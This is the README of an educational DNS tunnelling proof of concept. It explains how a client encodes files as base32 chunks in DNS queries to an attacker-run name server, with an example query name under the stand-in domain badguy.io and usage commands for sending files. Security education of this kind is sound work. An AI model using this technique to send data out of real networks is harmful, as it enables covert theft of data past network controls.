# DNS Tunneling POC

## Introduction

This is a proof of concept for a DNS tunnelling client and server, for security education. The DNS server implemented here is woefully incomplete, as the point is not to resolve names, but to participate in file transfers. The server only handles A and AAAA queries with a single name, and responds to A queries with the same IP address (16.32.64.128), and to AAAA queries with a response indicating that an IPv6 address is not available, as per [RFC 4074 section 3](https://datatracker.ietf.org/doc/html/rfc4074#section-3).

## Theory of operation

The `dns_send` client can send a file or standard input to a remote name server controlled by an attacker. Each file transfer is identified by a uuid. Each payload  of the data transfer  consists of the uuid, a packet sequence number and 120 bytes of data. The payload is encoded in base 32, then included in a domain name.  This is an example of such a name, which encodes a UUID, a sequence number and 120 bytes of data, and which obeys all of the rules for an Internet domain name:

```text
QLFGR3VWU5D37KJMLXJOKUKDJERQAAAANNXHIZRIEJLXE33UMUQCKZBAMJ4X.IZLTEB2G6IBFOMQGC5BAN5TGM43FOQQCKZC4NYRCYIDQMF4WY33BMQWT43DF.NZTXI2BMEBTGS3DFNZQW2ZJMBIQCAIBAEAQCAIBAOBQXS3DPMFSC2PTTMVYX.KZLOMNSSAKRAGEZDAKJ3BJ6QU.badguy.io
```

In an attack scenario, an attacker would register the badguy.io domain  (from the name above), point the DNS server for the domain to a server running the  `dns-server` application in this project, so that it could receive and decode the specially crafted DNS queries. Since each name query is unique, there is no concern with caching.

## Building

Run `make`. This will build `dns-server`  and `dns-send` in the `dist` directory.  See the `Makefile` for additional targets.

## Running

Start the server by running `dns-server`. As the server binds to privileged port 53, it must be run as root (or sudo).
The client usage is as follows:

```shell
dns_send [file [ip]]
```

Without any parameters, the program reads from stdin, and uses the default system resolver to eventually reach the attacker DNS server , provided the `dns-send` program is modified to resolve the correct domain (and not badguy.io).

A file name can be specified as the first argument, in which case the file will be transmitted through as many DNS requests as needed.

An IP address can be specified as the second parameter, which is useful in cases where you do not want to set up a domain and a server running `dns-server`. In that case, you can run `dns-server` on any machine, including the same machine on which `dns-send` is running, and point `dns-send` at the server. While this is not a realistic attack scenario in most cases, it will demonstrate transmitting large amounts of data over DNS.

### Running on Linux

On systems using `systemd`, you will have to temporarily turn off the systemd resolver to free up port 53 (used by the POC server).

```shell
sudo systemctl stop systemd-resolved
```

Since the POC server really cannot resolve anything, you may want to edit `/etc/resolv.conf` to point to a real server, such as `8.8.8.8`

### Running on WSL

WSL requires Internet Connection Sharing which uses port 53. It is therefore not possible to run the server on WSL. The server can however run in a Windows command window.

## Detecting DNS tunnelling
Due to the nature of DNS tunneling, there are several methods to detect it, and thereafter prevent it. See the [Detecting DNS Tunelling](https://www.sans.org/white-papers/34152/) paper from the SANS Institute for examples.


## Dependencies

- Debian package `uuid-dev`
- Debian package `libbsd-dev` (not needed for BSD)

## Included open source code

Base32 encoder/decoder from [Google Authenticator PAM module](https://github.com/google/google-authenticator-libpam)

## References

- [TCP/IP Illustrated Volume 1, W. Richard Stevens](https://www.amazon.com/TCP-Illustrated-Vol-Addison-Wesley-Professional/dp/0201633469)
- https://courses.cs.duke.edu//fall16/compsci356/DNS/DNS-primer.pdf
- [RFC 4074](https://datatracker.ietf.org/doc/html/rfc4074#)
- [RFC1034](https://datatracker.ietf.org/doc/html/rfc1034)
 
